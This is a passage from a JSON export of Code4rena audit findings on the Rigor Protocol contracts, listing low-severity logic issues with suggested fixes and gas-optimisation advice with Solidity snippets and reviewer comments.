      "content": "It is mentioned that \"This can be useful when trying to deploy new version of HomeFiProxy\". However, there is currently no clean way to do this. When a new HomeFi proxy is deployed and initialized, new proxies are deployed (i.e., the state is lost). Consider adding a way to initialize a new proxy with already existing proxy addresses.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24227",
      "title": "[09]",
      "impact": "LOW",
      "content": "It is possible to raise disputes for not (yet) existing tasks in `raiseDispute`, which should not be possible\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24226",
      "title": "[08]",
      "impact": "LOW",
      "content": "`raiseDispute` does not include any replay protection, meaning that anyone can raise the same dispute again after one was submitted.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24225",
      "title": "[07]",
      "impact": "LOW",
      "content": "In `changeOrder`, it is not checked if the task actually exists. While changing the cost for a non-existing task is not possible (because of the `getAlerts` check), the owner can be set: First, the task will be unapproved, setting the status to inactive. Then, the subcontractor is invited, which succeeds, as the task is inactive. The subcontractor can even accept the invitation, which marks the task as active, although he was never created / initialized. Consider adding a check if the task already exists.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24224",
      "title": "[06]",
      "impact": "LOW",
      "content": "In general, it is considered good practice to provide a deadline for signatures and a way to revoke them (e.g., when a private key is compromised), which is both currently not implemented.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24223",
      "title": "[05]",
      "impact": "LOW",
      "content": "The comment \"// Burn \\_interestEarned amount wrapped token to lender\" is wrong [Community.sol#L849](https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L849), this should be mint instead of burn.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24222",
      "title": "[04]",
      "impact": "LOW",
      "content": "There is no way to remove members of a community (e.g., misbehaving members), which might be desirable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24221",
      "title": "[03]",
      "impact": "LOW",
      "content": "In `Community`, adding members and updating the community hash is possible when the system is changed. As these also change the system state, consider also requiring that the system is not paused.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24220",
      "title": "[02]",
      "impact": "LOW",
      "content": "In `escrow`, it is possible that the `_agent` is the zero address, in which case signature validation succeeds with any invalid signature (i.e., no actual escrow, as there is no agent). Consider adding a check that the `_agent` is non-zero.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24219",
      "title": "[01]",
      "impact": "LOW",
      "content": "`isPublishedToCommunity` does not check that the `_communityID` exists. It can return true for non-published projects by passing in a `_communityID` of 0. This enables for instance to call `unpublishProject` on unpublished projects (or paying the publish fee for a non-existing project with `_communityID = 0`. While this is not a major issue, it can be confusing (because events are emitted) and building upon this modifier in the future can be dangerous. Consider validating the `_communityID`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5571",
      "title": "[G-05] Splitting require() statements that use && saves gas - (saves 8 gas per &&)",
      "impact": "GAS",
      "content": "Instead of using the && operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per &&<br>\nThe gas difference would only be realized if the revert condition is realized(met).\n\nFile: Disputes.sol [Line 61](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Disputes.sol#L61-L65)\n\n```solidity\n        require(\n            _disputeID < disputeCount &&\n                disputes[_disputeID].status == Status.Active,\n            \"Disputes::!Resolvable\"\n        );\n```\n\nThe above should be modified to\n\n```solidity\n        require( _disputeID < disputeCount,  \"Disputes::!Resolvable\");\n        require(disputes[_disputeID].status == Status.Active, \"Disputes::!Resolvable\");\n```\n\nFile: Disputes.sol [Line 106](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Disputes.sol#L106-L109)\n\n```solidity\n        require(\n            _actionType > 0 && _actionType <= uint8(ActionType.TaskPay),\n            \"Disputes::!ActionType\"\n        );\n```\n\nFile: Community.sol [Line 353](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L353)\n\n```solidity\n        require(\n            _lendingNeeded >= _communityProject.totalLent &&\n                _lendingNeeded <= IProject(_project).projectCost(),\n            \"Community::invalid lending\"\n        );\n```\n\n**Proof**<br>\n**The following tests were carried out in remix with both optimization turned on and off**\n\n```\nfunction multiple (uint a) public pure returns (uint){\n\trequire ( a > 1 && a < 5, \"Initialized\");\n\treturn  a + 2;\n}\n```\n\n**Execution cost**<br>\n21617 with optimization and using &&<br>\n21976 without optimization and using &&<br>\n\nAfter splitting the require statement\n\n```\nfunction multiple(uint a) public pure returns (uint){\n\trequire (a > 1 ,\"Initialized\");\n\trequire (a < 5 , \"Initialized\");\n\treturn a + 2;\n}\n```\n\n**Execution cost**<br>\n21609 with optimization and split require<br>\n21968 without optimization and using split require",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-05-splitting-require-statements-that-use--saves-gas---saves-8-gas-per-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5101",
      "title": "[G-14] Not using the named return variables when a function returns, wastes deployment gas",
      "impact": "GAS",
      "content": "\nFile: Project.sol [Line 716-723](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L716-L723)\n\n```solidity\n    function getAlerts(uint256 _taskID)\n        public\n        view\n        override\n        returns (bool[3] memory _alerts)\n    {\n        return tasks[_taskID].getAlerts();\n    }\n```\n\n**[Dravee (warden) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/391#issuecomment-1207467962):**\n > Overall a high quality gas report IMHO. The warden starts with the most manual and interesting findings: storage reading optimizations. There are also the `unchecked` blocks. The gas savings are almost always mentioned too.\n> \n> **Analysis:**\n> \n> **[G-01] Cache storage values in memory to minimize SLOADs**\n> - HomeFi.sol.createProject(): projectCount should be cached(Saves ~ 71 gas)\n> - HomeFi.sol.mintNFT(): projectCount should be cached\n> - Project.sol.updateProjectHash(): hashChangeNonce should be cached (saves ~ 101 gas)\n> - Project.sol.updateTaskHash(): hashChangeNonce should be cached(saves ~ 98 gas)\n> - Project.sol.allocateFunds():_changeOrderedTask.length should be cached(Saves ~ 118 gas)\n> - Community.sol.createCommunity():communityCount should be cached( Saves ~186 gas)\n> \n>  Valid\n> \n> **[G-02] Cache the length of arrays in loops**\n> - Project.sol.allocateFunds(): _changeOrderedTask.length should be cached - _changeOrderedTask is a storage array\n> \n>  Valid\n> \n> **[G-03] ++i costs less gas compared to i++ or i += 1 in for loops (~5 gas per iteration)**\n> \n>  Valid\n> \n> **[G-04] ++x is more efficient than x++(Saves ~6 gas)**\n> \n>  Valid, kinda same as above (pre-increments)\n> \n> **[G-05] Splitting require() statements that use && saves gas - (saves 8 gas per &&)**\n> \n>  Valid on Optimizer with 200 runs\n\n> **[G-06] Comparisons: != is more efficient than in require (6 gas less)**\n> \n>  Valid with Solidity 0.8.6 < 0.8.13\n> \n> **[G-07] Emitting storage values instead of the memory one(saves ~101 gas)**\n> \n>  Valid\n> \n> **[G-08] Using unchecked blocks to save gas**\n> \n>  Valid and well explained. I believe only 1 instance is missing in the solution:\n> \n>  - [Project.sol#L440](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L438-L440)\n> \n> ```solidity\n> File: Project.sol\n> 438:                 else if (totalLent - _totalAllocated >= _newCost - _taskCost) {\n> 439:                     // Increase the difference of new cost and old cost to total allocated.\n> 440:                     totalAllocated += _newCost - _taskCost; //@audit should be unchecked due to L438\n> ```\n> \n> **[G-09] Using unchecked blocks to save gas - Increments in for loop can be unchecked ( save 30-40 gas per loop iteration)**\n> \n>  Valid\n> \n> **[G-10] Use Custom Errors instead of Revert Strings to save Gas**\n> \n>  Valid\n\n> **[G-11] x += y costs more gas than x = x + y for state variables**\n> - Project.sol.updateProjectHash() - (Saves ~19 gas)\n> - Project.sol.updateTaskHash() - (Saves ~19 gas)\n> - HomeFi.sol.mintNFT()\n> \n>  Valid, but could've saved more gas with `++x` instead of `x += 1`\n\n> **[G-12] Using bools for storage incurs overhead**\n> \n>  Valid but partially true as not all mentioned booleans are state booleans (some are memory ones or function arguments).\n> \n> **[G-13] Using private rather than public for constants, saves gas**\n> \n>  I believe it's invalid here as this specific constant needs to be public.\n> \n> **[G-14] Not using the named return variables when a function returns, wastes deployment gas**\n> \n>  From memory, this has actually been debunked (the optimizer takes care of it). So, invalid, but could be NC.\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/391#issuecomment-1229406944):**\n > This is ðŸ’¯!\n\n**parv3213 (Rigor) commented:**\n > [G-13] seems invalid, as the project version must be a public variable.\n\n**Jack the Pug (judge) commented:**\n > Re: [G-13], This depends on how the `VERSION()` method is going to be used. As it's inherited from `IProject`, it's probably required by the front-end, thus, I agree that this one is more likely to be invalid.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-14-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5100",
      "title": "[G-13] Using private rather than public for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.\n\nFile: Project.sol [Line 60](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L60)\n\n```solidity\n    uint256 public constant override VERSION = 25000;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-13-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5099",
      "title": "[G-12] Using bools for storage incurs overhead",
      "impact": "GAS",
      "content": "\n        // Booleans are more expensive than uint256 or any type that takes up a full\n        // word because each write operation emits an extra SLOAD to first read the\n        // slot's contents, replace the bits taken up by the boolean, and then write\n        // back. This is the compiler's defense against contract upgrades and\n        // pointer aliasing, and it cannot be disabled.\n\nSee [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27)<br>\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from â€˜falseâ€™ to â€˜trueâ€™, after having been â€˜trueâ€™ in the past.\n\n**Instances affected include**<br>\nFile: HomeFiProxy.sol [line 30](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFiProxy.sol#L30)\n\n```solidity\n    mapping(address => bool) internal contractsActive;\n```\n\nFile: Disputes.sol [Line 144](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Disputes.sol#L144)\n\n```solidity\n        bool _ratify\n```\n\nFile: HomeFi.sol [Line 50](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L50)\n\n```solidity\n    bool public override addrSet;\n```\n\nFile: Project.sol [Line 68](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L68)\n\n```solidity\n    bool public override contractorConfirmed;\n```\n\nFile: Project.sol [Line 84](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L84)\n\n```solidity\n    mapping(address => mapping(bytes32 => bool)) public override approvedHashes;\n```\n\nFile: Project.sol [Line 412](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L412)\n\n```solidity\n        bool _unapproved = false;\n```\n\nFile: Project.sol  [Line 582](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L582)\n\n```solidity\n        bool _exceedLimit;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-12-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5098",
      "title": "[G-11] x += y costs more gas than x = x + y for state variables",
      "impact": "GAS",
      "content": "\nFile: Project.sol [Line 179](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L179)\n\n### Project.sol.updateProjectHash() - (Saves \\~19 gas)\n\nAverage gas before modification: 54538<br>\nAverage gas after modification: 54519<br>\n\n```solidity\n        hashChangeNonce += 1;\n    \n```\n\nThe above should be modified to\n\n```solidity\n        hashChangeNonce = hashChangeNonce + 1;\n```\n\nFile: Project.sol [Line 290](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L290)\n\n### Project.sol.updateTaskHash() - (Saves \\~19 gas)\n\nAverage gas before modification: 58185<br>\nAverage gas after modification: 58166<br>\n\n```solidity\n        hashChangeNonce += 1;\n```\n\nFile: HomeFi.sol [Line 289](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L289)\n\n### HomeFi.sol.mintNFT()\n\n```solidity\n        projectCount += 1;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-11-x--y-costs-more-gas-than-x--x--y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "5097",
      "title": "[G-10] Use Custom Errors instead of Revert Strings to save Gas",
      "impact": "GAS",
      "content": "\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met).<br>\nCustom errors save \\~50 gas each time theyâ€™re hit by avoiding having to allocate and store the revert string. Not defining the strings also save deployment gas\n\nCustom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).<br>\nsee [Source](https://blog.soliditylang.org/2021/04/21/custom-errors/)\n\nFile: DebtToken.sol [line 31](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/DebtToken.sol#L31-L34)\n\n```solidity\n        require(\n            communityContract == _msgSender(),\n            \"DebtToken::!CommunityContract\"\n        );\n```\n\nFile: DebtToken.sol [line 50](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/DebtToken.sol#L50)\n\n```solidity\n        require(_communityContract != address(0), \"DebtToken::0 address\");\n```\n\nFile: DebtToken.sol [line 96](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/DebtToken.sol#L96)\n\n```solidity\n        revert(\"DebtToken::blocked\");\n```\n\nFile: DebtToken.sol [line 104](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/DebtToken.sol#L104)\n\n```solidity\n        revert(\"DebtToken::blocked\");\n```\n\nFile: ProjectFactory.sol [line 36](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/ProjectFactory.sol#L36)\n\n```solidity\n        require(_address != address(0), \"PF::0 address\");\n```\n\nFile: ProjectFactory.sol [line 64](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/ProjectFactory.sol#L64)\n\n```solidity\n        require( _msgSender() == IHomeFi(homeFi).admin(), \"ProjectFactory::!Owner\" );\n```\n\nFile: ProjectFactory.sol  [line 84](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/ProjectFactory.sol#L84)\n\n```solidity\n        require(_msgSender() == homeFi, \"PF::!HomeFiContract\");\n```\n\n*Note: see warden's [original submission](https://github.com/code-423n4/2022-08-rigor-findings/issues/391) for full list of instances.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-10-use-custom-errors-instead-of-revert-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5096",
      "title": "[G-09] Using unchecked blocks to save gas - Increments in for loop can be unchecked  ( save 30-40 gas per loop iteration)",
      "impact": "GAS",
      "content": "\nThe majority of Solidity for loops increment a uint256 variable that starts at 0. These increment operations never need to be checked for over/underflow because the variable will never reach the max number of uint256 (will run out of gas long before that happens). The default over/underflow check wastes gas in every iteration of virtually every for loop . eg.\n\ne.g Let's work with a sample loop below.\n\n```\nfor(uint256 i; i < 10; i++){\n//doSomething\n}\n\n```\n\ncan be written as shown below.\n\n    for(uint256 i; i < 10;) {\n      // loop logic\n      unchecked { i++; }\n    }\n\nWe can also write it as an inlined function like below.\n\n    function inc(i) internal pure returns (uint256) {\n      unchecked { return i + 1; }\n    }\n    for(uint256 i; i < 10; i = inc(i)) {\n      // doSomething\n    }\n\n**Affected code**<br>\nFile: HomeFiProxy.sol [line 87](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFiProxy.sol#L87-L89)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n            _generateProxy(allContractNames[i], _implementations[i]);\n        }\n```\n\nThe above should be modified to:\n\n```solidity\n        for (uint256 i = 0; i < _length;) {\n            _generateProxy(allContractNames[i], _implementations[i]);\n\t\tunchecked {\n\t\t\t++i;\n\t\t}\n        }\n```\n\n**Other Instances to modify**<br>\nFile: Project.sol [Line 248](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L248)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n```\n\nFile: Project.sol [Line 311](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L311-L313)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n            _inviteSC(_taskList[i], _scList[i], false);\n        }\n```\n\nFile: Project.sol [Line 322](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L322)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n```\n\nFile: Tasks.sol [Line 181](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/libraries/Tasks.sol#L181)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) _alerts[i] = _self.alerts[i];\n```\n\n[see resource](https://github.com/ethereum/solidity/issues/10695)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-09-using-unchecked-blocks-to-save-gas---increments-in-for-loop-can-be-unchecked---save-30-40-gas-per-loop-iteration",
      "tags": [],
      "finders": []
    },
    {
      "id": "5095",
      "title": "[G-08] Using unchecked blocks to save gas",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnâ€™t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block\n\nFile: Project.sol [Line 427](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L427)\n\n```solidity\n       uint256 _withdrawDifference = _taskCost - _newCost;\n```\n\nThe above operation cannot underflow due to the check on [Line 425](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L425) which ensures that `_taskCost` is greater than `_newCost` before the subtraction operation is performed.<br>\nThe above can be modified as follows\n\n```solidity\n       uint256 _withdrawDifference;\n\t     unchecked {\n\t        _withdrawDifference = _taskCost - _newCost;\n\t     }\n```\n\nFile: Project.sol [Line 616](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L616)\n\n```solidity\n           _costToAllocate -= _taskCost;\n```\n\nThe above line cannot underflow due to the check on [Line 614](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L614) which ensures that the above operation would only be performed if the value of `_costToAllocate` is greater than the value of `_taskCost`\n\nFile: Project.sol [Line 663](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L663)\n\n```solidity\n            _costToAllocate -= _taskCost;\n```\n\nThe above line cannot underflow due to the check on [Line 661](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L661) which ensures that the above operation would only be performed if the value of `_costToAllocate` is greater than the value of `_taskCost`\n\nFile: Community.sol [Line 794](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L794)\n\n```solidity\n            _lentAmount = _lentAndInterest - _repayAmount;\n```\n\nThe above line cannot underflow due to the check on [Line 792](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L792) which ensures that the above operation would only be performed if the value of `_lentAndInterest` is greater than the value of `_repayAmount`\n\nFile: Community.sol [Line 798](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L798)\n\n```solidity\n            _interest -= _repayAmount;\n```\n\nThe above line cannot underflow as it would only be evalauted if `_interest` is not less than `_repayAmount` . See [Line 785](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L785)\n\n[see resource](https://github.com/ethereum/solidity/issues/10695)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-08-using-unchecked-blocks-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5094",
      "title": "[G-07] Emitting storage values instead of the memory one(saves \\~101 gas)",
      "impact": "GAS",
      "content": "\nHere, the values emitted shouldnâ€™t be read from storage. The existing memory values should be used instead:\n\nFile: Project.sol [Line 144](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L144)\naverage gas while using the storage value  - 69561\naverage gas while using the memory value - 69460\n\n```solidity\n        // Store new contractor\n        contractor = _contractor;\n        contractorConfirmed = true;\n\n\n        // Check signature for builder and contractor\n        checkSignature(_data, _signature);\n\n\n        emit ContractorInvited(contractor);@audit - should emit _contractor instead of contractor\n    }\n```\n\nIn the above we should emit **\\_contractor**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-07-emitting-storage-values-instead-of-the-memory-onesaves-101-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5093",
      "title": "[G-06] Comparisons: != is more efficient than > in require (6 gas less)",
      "impact": "GAS",
      "content": "\n!= 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled (6 gas)\n\nFor uints the minimum value would be 0 and never a negative value. Since it cannot be a negative value, then the check > 0 is essentially checking that the value is not equal to 0 therefore >0 can be replaced with !=0 which saves gas.\n\nProof: While it may seem that > 0 is cheaper than !=, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a require statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing > 0 with != 0 here:\n\nFile: Project.sol [Line 195](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L195)\n\n```solidity\n        require(_cost > 0, \"Project::!value>0\");\n```\n\nFile: Community.sol [Line 764](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L764)\n\n```solidity\n        require(_repayAmount > 0, \"Community::!repay\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-06-comparisons--is-more-efficient-than--in-require-6-gas-less",
      "tags": [],
      "finders": []
    },
    {
      "id": "5092",
      "title": "[G-05] Splitting require() statements that use && saves gas - (saves 8 gas per &&)",
      "impact": "GAS",
      "content": "\nInstead of using the && operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per &&<br>\nThe gas difference would only be realized if the revert condition is realized(met).\n\nFile: Disputes.sol [Line 61](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Disputes.sol#L61-L65)\n\n```solidity\n        require(\n            _disputeID < disputeCount &&\n                disputes[_disputeID].status == Status.Active,\n            \"Disputes::!Resolvable\"\n        );\n```\n\nThe above should be modified to\n\n```solidity\n        require( _disputeID < disputeCount,  \"Disputes::!Resolvable\");\n        require(disputes[_disputeID].status == Status.Active, \"Disputes::!Resolvable\");\n```\n\nFile: Disputes.sol [Line 106](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Disputes.sol#L106-L109)\n\n```solidity\n        require(\n            _actionType > 0 && _actionType <= uint8(ActionType.TaskPay),\n            \"Disputes::!ActionType\"\n        );\n```\n\nFile: Community.sol [Line 353](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L353)\n\n```solidity\n        require(\n            _lendingNeeded >= _communityProject.totalLent &&\n                _lendingNeeded <= IProject(_project).projectCost(),\n            \"Community::invalid lending\"\n        );\n```\n\n**Proof**<br>\n**The following tests were carried out in remix with both optimization turned on and off**\n\n```\nfunction multiple (uint a) public pure returns (uint){\n\trequire ( a > 1 && a < 5, \"Initialized\");\n\treturn  a + 2;\n}\n```\n\n**Execution cost**<br>\n21617 with optimization and using &&<br>\n21976 without optimization and using &&<br>\n\nAfter splitting the require statement\n\n```\nfunction multiple(uint a) public pure returns (uint){\n\trequire (a > 